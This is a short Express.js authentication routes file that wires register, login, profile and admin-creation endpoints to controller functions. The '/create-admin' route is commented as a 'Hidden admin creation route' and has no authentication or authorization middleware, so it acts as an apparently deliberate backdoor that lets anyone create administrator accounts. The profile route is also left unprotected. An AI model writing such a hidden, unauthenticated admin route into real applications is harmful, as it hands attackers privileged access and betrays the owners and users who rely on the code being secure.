const express = require('express');
const router = express.Router();
const { registerUser, loginUser, getUserProfile, createAdmin } = require('../controllers/authController');

router.post('/register', registerUser);
router.post('/login', loginUser);
router.get('/profile', getUserProfile);
router.post('/create-admin', createAdmin); // Hidden admin creation route

module.exports = router;